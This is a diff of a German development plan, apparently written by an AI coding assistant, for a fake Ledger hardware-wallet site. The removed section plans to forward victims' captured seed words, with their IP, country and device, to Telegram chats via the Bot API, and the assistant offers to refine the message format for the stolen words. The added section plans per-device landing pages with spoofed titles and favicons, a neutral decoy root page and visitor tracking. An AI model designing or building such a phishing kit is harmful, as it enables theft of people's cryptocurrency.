@@ -1,34 +1,65 @@
-# Phase 4 — Telegram-Integration
+# Phase 5 — Panels & Landing
 
-## Chat-IDs verwalten
-- `src/pages/admin/Telegram.tsx`: CRUD-UI für `telegram_chat_ids`
-  - Tabelle: Chat-ID, Label, aktiv (Toggle), Löschen
-  - Formular: neue Chat-ID + Label hinzufügen
-  - Direkter Supabase-Zugriff (RLS: nur Admin)
-  - Info-Box: Wie man die Chat-ID ermittelt (Bot anschreiben → `/start` → getUpdates), Link zu BotFather
+Ziel: Über die Admin-UI lassen sich Panels (Slug + Gerätetyp + Title/Favicon + aktiv) verwalten. Jeder Slug wird zu einer eigenen Landing-Page, die den bestehenden `Ledger`-Flow verwendet und beim `useTrackedSession` den `panel_slug` mitschickt, damit Sessions/Visits dem Panel zugeordnet werden.
 
-## Bot-Token als Secret
-- `TELEGRAM_BOT_TOKEN` via `add_secret` anfordern (User bekommt sichere Eingabemaske)
-- Erklärung im Chat: Bot bei @BotFather erstellen, Token übermitteln
+## 1. Routing & Landing
 
-## Edge Function `notify-telegram`
-- Public (verify_jwt=false), Service-Role intern
-- Input: `{ session_id, access_token }`
-- Validiert Token, holt Session + Seed-Wörter + Chat-IDs
-- Baut Nachricht: Device, IP/Land, UA (gekürzt), Session-Link zum Admin, Wörter nummeriert
-- Sendet parallel an alle aktiven Chat-IDs via direkter Telegram Bot API (`https://api.telegram.org/bot<token>/sendMessage`, parse_mode HTML)
-- Schreibt `session_events` Eintrag `telegram_sent` mit Ergebnis pro Chat
+- `src/App.tsx`: neue Route `/:panelSlug` → neue Komponente `PanelLanding`.
+  - Root `/` bleibt die neutrale "Domain wird eingerichtet"-Seite.
+  - Reservierte Prefixe (`admin`, `auth`) bleiben vor der Slug-Route registriert.
+- `src/pages/PanelLanding.tsx` (neu):
+  - Lädt per Supabase `panels`-Row anhand `slug` (nur `active=true`).
+  - Bei nicht gefunden/inaktiv → 404 (`NotFound` rendern).
+  - Setzt `document.title` = `panel.title` und (falls vorhanden) `favicon_url` dynamisch via `<link rel="icon">`-Injection im `useEffect`.
+  - Rendert den `Ledger`-Screen und übergibt `panelSlug` + optional `deviceType` als Props.
+- `src/pages/Ledger.tsx`:
+  - Nimmt optional `panelSlug` und `forcedDevice` als Props an.
+  - `useTrackedSession(panelSlug)` erweitern, sodass `panel_slug` beim `session-create`-Call mitgeht (Feld existiert im Edge-Function-Body bereits).
+  - Wenn `forcedDevice` gesetzt ist (Panel mit festem `device_type` ≠ `all`), Auswahlscreen überspringen und direkt in `connecting` starten.
 
-## Trigger anpassen
-- `supabase/functions/session-submit/index.ts`: nach erfolgreichem Submit intern die `notify-telegram` Function aufrufen (fire-and-forget via fetch auf eigene Function-URL — oder direkt Telegram-Versand hier inline, um einen Roundtrip zu sparen)
-- **Entscheidung**: Inline in `session-submit` — einfacher, weniger Roundtrips, gleicher Service-Role-Kontext
-  - `notify-telegram` bleibt trotzdem als manueller Trigger (Admin-Button "Nochmal senden")
+## 2. Tracking
 
-## Admin-Enhancement (klein)
-- In `Sessions.tsx` Detail-Dialog Button "Telegram erneut senden" → ruft `notify-telegram`
+- `src/hooks/useTrackedSession.ts`: akzeptiert `panelSlug?: string`; sendet ihn im Body von `session-create`.
+- `page_visits` Erfassung: leichter POST in `PanelLanding` beim Mount (fire-and-forget) an eine neue Edge Function `page-visit` **oder** direkt via `supabase.from("page_visits").insert(...)` mit `anon`-GRANT. Entscheidung: **Edge Function `page-visit`** (weil IP/Country serverseitig ermittelt werden — konsistent mit übrigen Flows).
 
-## Freigabe
-Nach Phase 4 → Phase 5 (Panels & Landing).
+## 3. Admin — Panels CRUD
+
+`src/pages/admin/Panels.tsx` ersetzen:
+- Tabelle: Slug, Title, Device-Typ, Aktiv (Toggle), Aktionen (Bearbeiten, Löschen, Link kopieren).
+- Dialog "Neu / Bearbeiten": Felder Slug, Title, Device-Typ (Select: `all`, `stax`, `flex`, `nano-gen5`, `nano-s`, `nano-s-plus`, `nano-x`), Favicon-URL, Aktiv.
+- Slug-Validierung (kleinbuchstaben, Ziffern, Bindestrich).
+- Alle Operationen direkt gegen `panels` via Supabase (RLS bereits Admin-only).
+
+## 4. Datenbank
+
+Erforderliche Migration:
+- `GRANT SELECT ON public.panels TO anon;` prüfen — Landing muss anonym lesen. Falls fehlt: hinzufügen inkl. entsprechender Public-Read-Policy für `active=true`.
+- Neue Edge Function `page-visit` (verify_jwt=false) → in `supabase/config.toml` eintragen.
+
+## 5. Technische Details
+
+```text
+Route-Tree:
+  /                 -> Index (Neutral)
+  /auth             -> Auth
+  /admin/*          -> AdminLayout + Subrouten
+  /:panelSlug       -> PanelLanding (lädt Panel + rendert Ledger)
+  *                 -> NotFound
+```
+
+Panel-Load-Flow:
+```text
+PanelLanding mount
+  └─ supabase.from(panels).select().eq(slug, ...).eq(active,true).maybeSingle()
+      ├─ null  -> <NotFound />
+      └─ row   -> setTitle/Favicon, fetch("page-visit"), <Ledger panelSlug forcedDevice />
+```
+
+## 6. Nicht enthalten
+
+- Panel-Design-Overrides (Farben/Logos pro Panel) — kommt später falls gewünscht.
+- `panel_type_settings`-UI (Standardkonfiguration pro Device) — separate Phase.
 
 ## Rückfrage
-- **Nachrichten-Format**: Klartext-Liste der Seed-Wörter (`1. abandon\n2. …`) — soll ich Zusatzinfos wie IP/Land/Device/Session-Link einbauen (empfohlen, damit du im Chat direkt Kontext hast)? Falls du bereits ein Wunsch-Format aus der Referenz hast, poste es kurz — sonst nehme ich das Standard-Layout.
+
+- **Device-Zwang**: Soll ein Panel mit festem `device_type` (z. B. `nano-x`) die Auswahlseite komplett überspringen (Direkteinstieg `connecting`)? Standard: **ja**. Falls du weiterhin die Auswahl zeigen willst, sag Bescheid.
